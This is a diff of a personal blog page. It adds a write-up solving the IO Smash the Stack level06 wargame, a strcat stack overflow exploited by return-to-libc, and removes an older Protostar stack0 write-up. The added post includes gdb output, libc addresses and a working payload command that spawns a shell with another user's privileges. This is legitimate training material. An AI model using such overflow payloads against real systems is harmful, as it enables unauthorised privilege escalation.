@@ -104,6 +104,161 @@
   
   <div class="post">
     <h1 class="post-title">
+      <a href="/posts/level06iosmash">
+        Level 06 I/O Smash the Stack
+      </a>
+    </h1>
+
+    <span class="post-date">26 Dec 2014</span>
+
+    <p>Those days I have been playing a little bit with <a href="http://io.smashthestack.org/">IO Smash the Stack</a>. By now I am in the level 8.</p>
+
+<p>Today I will explain how I resolved the level06 and the process that I followed. In this level we have the code and it is more large than the previous.</p>
+<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="c1">//written by bla</span>
+<span class="c1">//inspired by nnp</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+
+<span class="k">enum</span><span class="p">{</span>
+<span class="n">LANG_ENGLISH</span><span class="p">,</span>
+<span class="n">LANG_FRANCAIS</span><span class="p">,</span>
+<span class="n">LANG_DEUTSCH</span><span class="p">,</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="n">language</span> <span class="o">=</span> <span class="n">LANG_ENGLISH</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">UserRecord</span><span class="p">{</span>
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kt">void</span> <span class="nf">greetuser</span><span class="p">(</span><span class="k">struct</span> <span class="n">UserRecord</span> <span class="n">user</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="n">greeting</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="k">switch</span><span class="p">(</span><span class="n">language</span><span class="p">){</span>
+        <span class="k">case</span> <span class="nl">LANG_ENGLISH</span><span class="p">:</span>
+            <span class="n">strcpy</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="s">&quot;Hi &quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="nl">LANG_FRANCAIS</span><span class="p">:</span>
+            <span class="n">strcpy</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="s">&quot;Bienvenue &quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="nl">LANG_DEUTSCH</span><span class="p">:</span>
+            <span class="n">strcpy</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="s">&quot;Willkommen &quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="n">user</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">greeting</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">env</span><span class="p">){</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;USAGE: %s [name] [password]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">struct</span> <span class="n">UserRecord</span> <span class="n">user</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">strncpy</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">name</span><span class="p">));</span>
+    <span class="n">strncpy</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">password</span><span class="p">));</span>
+
+    <span class="kt">char</span> <span class="o">*</span><span class="n">envlang</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;LANG&quot;</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">envlang</span><span class="p">)</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">envlang</span><span class="p">,</span> <span class="s">&quot;fr&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+            <span class="n">language</span> <span class="o">=</span> <span class="n">LANG_FRANCAIS</span><span class="p">;</span>
+        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">envlang</span><span class="p">,</span> <span class="s">&quot;de&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+            <span class="n">language</span> <span class="o">=</span> <span class="n">LANG_DEUTSCH</span><span class="p">;</span>
+
+    <span class="n">greetuser</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>What this code does is easy to understand and also it is easy to spot where the vulnerability resides. Is in the function <code>strcat</code>. If we go to the <code>man page</code>.</p>
+
+<blockquote>
+<p>The  strcat() function appends the src string to the dest string, overwriting the terminating null byte (&#39;\0&#39;) at the end of dest, and then adds a terminating null byte.  The strings may not overlap, and the dest string must have enough space for the result.  If dest is not large enough, program behavior is unpredictable; buffer overruns  are  a  favorite  avenue  for  attacking secure programs.</p>
+
+<p>The strncat() function is similar, except that</p>
+
+<ul>
+<li> it will use at most n bytes from src; and</li>
+<li> src does not need to be null-terminated if it contains n or more bytes.</li>
+</ul>
+</blockquote>
+
+<p>Basically strcat will append the src string until we get the <code>\0</code>. How we want to overflow the stack of greeting in the function <code>greetuser</code> we should look how the stack looks like when this function is called. To find out we will use <code>gdb</code>.</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>disas greetuser
+Dump of assembler code <span class="k">for</span> <span class="k">function</span> greetuser:
+   0x0804851c &lt;+0&gt;: push   ebp
+   0x0804851d &lt;+1&gt;: mov    ebp,esp
+   0x0804851f &lt;+3&gt;: sub    esp,0x58
+   0x08048522 &lt;+6&gt;: mov    eax,ds:0x8049964
+   0x08048527 &lt;+11&gt;:    cmp    eax,0x1
+   0x0804852a &lt;+14&gt;:    je     0x8048540 &lt;greetuser+36&gt;
+   0x0804852c &lt;+16&gt;:    cmp    eax,0x2
+   0x0804852f &lt;+19&gt;:    je     0x804855c &lt;greetuser+64&gt;
+   0x08048531 &lt;+21&gt;:    <span class="nb">test   </span>eax,eax
+   0x08048533 &lt;+23&gt;:    jne    0x8048574 &lt;greetuser+88&gt;
+   0x08048535 &lt;+25&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
+   0x08048538 &lt;+28&gt;:    mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x206948
+   0x0804853e &lt;+34&gt;:    jmp    0x8048574 &lt;greetuser+88&gt;
+   0x08048540 &lt;+36&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
+   0x08048543 &lt;+39&gt;:    mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x6e656942
+   0x08048549 &lt;+45&gt;:    mov    DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>,0x756e6576
+   0x08048550 &lt;+52&gt;:    mov    WORD PTR <span class="o">[</span>eax+0x8<span class="o">]</span>,0x2065
+   0x08048556 &lt;+58&gt;:    mov    BYTE PTR <span class="o">[</span>eax+0xa<span class="o">]</span>,0x0
+   0x0804855a &lt;+62&gt;:    jmp    0x8048574 &lt;greetuser+88&gt;
+   0x0804855c &lt;+64&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
+   0x0804855f &lt;+67&gt;:    mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x6c6c6957
+   0x08048565 &lt;+73&gt;:    mov    DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>,0x6d6d6f6b
+   0x0804856c &lt;+80&gt;:    mov    DWORD PTR <span class="o">[</span>eax+0x8<span class="o">]</span>,0x206e65
+   0x08048573 &lt;+87&gt;:    nop
+   0x08048574 &lt;+88&gt;:    lea    eax,<span class="o">[</span>ebp+0x8<span class="o">]</span>
+   0x08048577 &lt;+91&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+   0x0804857b &lt;+95&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
+   0x0804857e &lt;+98&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+   0x08048581 &lt;+101&gt;:   call   0x80483d0 &lt;strcat@plt&gt;
+   0x08048586 &lt;+106&gt;:   lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
+   0x08048589 &lt;+109&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+   0x0804858c &lt;+112&gt;:   call   0x80483f0 &lt;puts@plt&gt;
+   0x08048591 &lt;+117&gt;:   leave
+   0x08048592 &lt;+118&gt;:   ret
+End of assembler dump.
+gdb-peda<span class="nv">$ </span>b * 0x0804857e  <span class="p">;</span> Breakpoint before to call strcat
+gdb-peda<span class="nv">$ </span>r AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBB
+gdb-peda<span class="nv">$ </span>x/64xw <span class="nv">$esp</span>
+</code></pre></div>
+<p><img src="/public/images/stackio6.png" alt="stackio6"></p>
+
+<p>To exploit this we are going to use the technique <a href="http://insecure.org/sploits/linux.libc.return.lpr.sploit.html">Return Into Lib C</a>. What we have to do is overwrite the return address <code>0x080486af</code> with the system address and then build a fake stack such that when we resume the execution at the direction of system it sees a valid stack. It would be as simple as put the direction of exit followed by the direction of the string <code>/bin/sh</code>. All these directions can be uncovered with <code>gdb</code>.</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>p system
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ea9c30 &lt;system&gt;
+gdb-peda<span class="nv">$ </span>p <span class="nb">exit</span>
+<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e9d270 &lt;<span class="nb">exit</span>&gt;
+gdb-peda<span class="nv">$ </span>searchmem /bin/sh
+Searching <span class="k">for</span> <span class="s1">&#39;/bin/sh&#39;</span> in: None ranges
+Found <span class="m">1</span> results, display max <span class="m">1</span> items:
+libc : 0xb7faafb4 <span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span>
+</code></pre></div>
+<p>So the beginning of the <code>argv[1]</code> must be the direction of <code>
+exit</code> and then the direction of the string <code>/bin/sh</code> followed by as much data as needed until we reach the return address to overwrite it with the direction of system. To exploit it more easily is better use as language <code>FRANCAIS</code> or <code>DEUTSCH</code> since that will fill the <code>greeting</code> variable with more data. Since with the <code>english</code> version the <code>id</code> was initialize to <code>0</code> making the strcat function stopping when it reaches that value.</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">level6@io:/levels<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$LANG</span>
+en_GB.UTF-8
+level6@io:/levels<span class="nv">$ LANG</span><span class="o">=</span>de_GB.UTF-8
+level6@io:/levels<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$LANG</span>
+de_GB.UTF-8
+</code></pre></div>
+<p>And finally we get a fresh shell calling it as follows.</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">level6@io:/levels<span class="nv">$ </span>./level06 <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;\x70\xd2\xe9\xb7&quot; + &quot;\xb4\xaf\xfa\xb7&quot; + &quot;A&quot;*32&#39;</span><span class="sb">`</span> <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;B&quot;*25 + &quot;\x30\x9c\xea\xb7&quot;&#39;</span><span class="sb">`</span>
+Willkommen p�鷴��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB0��
+sh-4.2<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1006<span class="o">(</span>level6<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1006<span class="o">(</span>level6<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span>,1006<span class="o">(</span>level6<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
+sh-4.2<span class="err">$</span>
+</code></pre></div>
+<p>If you liked this post, you can
+<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level06iosmash&text=Level 06 I/O Smash the Stack&via=alvaro_fe">share it with your followers</a>
+or
+<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+
+  </div>
+  
+  <div class="post">
+    <h1 class="post-title">
       <a href="/posts/doublylist">
         How Linux Implements Generic List
       </a>
@@ -183,94 +338,6 @@
 
 <p>If you liked this post, you can
 <a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/doublylist&text=How Linux Implements Generic List&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="/posts/protostartstack0">
-        Stack 0 Protostart
-      </a>
-    </h1>
-
-    <span class="post-date">14 Dec 2014</span>
-
-    <p>I have started to play with the protostar VM along with nebula. This VM presents the concept about the memory issues as buffer overflows in stack and in the heap, format string and so on.</p>
-
-<p>The first exercise present a buffer overflow. The code is as follows.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
-<span class="cp">#include &lt;unistd.h&gt;</span>
-<span class="cp">#include &lt;stdio.h&gt;</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-
-  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-
-  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have changed the &#39;modified&#39; variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>To resolve this puzzle we should have clear how is carried out the flow execution of a program. In the C language the stack is a structure that is used to pass argument to the function, save return address and also to save the local variables. So in the following C code the stack would be.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span> <span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
-    <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">The stack grows downwards
-
-+————————————+
-| argument b |  The local variables are saved in reverse order.
-+————————————+
-| argument a |
-+————————————+
-| return     |  The return address is saved automatically by the 
-| address    |  call instruction in assembly.
-+————————————+
-|            |  The base pointer register. Is used to reference 
-|    EBP     |  inside the function without calculate offset 
-|            |  respect with the ESP.
-+————————————+
-|  local c   |
-+————————————+
-</code></pre></div>
-<p>The stack in the main function is.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">+————————————+
-| argument 2 |  
-+————————————+
-| argument 1 |
-+————————————+
-| return     |  
-| address    |  
-+————————————+
-|            |   
-|    EBP     |   
-|            |  
-+————————————+
-|  modified  |
-+————————————+
-|  buffer    |
-+————————————+
-</code></pre></div>
-<p>So if we are able to write more than 64 bytes in buffer we can overwrite the value in <code>modified</code>. But Are we able to achieve that? The answers is yes due to the code is using an insecure function <code>gets</code>. It does not limit the input so we are able to write more than 64 bytes. So with the following we can change the value.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span> <span class="nb">printf</span> <span class="s2">&quot;%065x&quot;</span> 1
-00000000000000000000000000000000000000000000000000000000000000001
-<span class="nv">$ </span>./stack0
-00000000000000000000000000000000000000000000000000000000000000001
-you have changed the <span class="s1">&#39;modified&#39;</span> variable
-</code></pre></div>
-<p>If you want to augment your knowledge about stack and how to exploit it I encourage to read the article <a href="http://q.hscott.net/reads/stack_smashing.pdf">Smash the Stack For Fun And Profit by Aleph One</a></p>
-
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/protostartstack0&text=Stack 0 Protostart&via=alvaro_fe">share it with your followers</a>
 or
 <a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
 
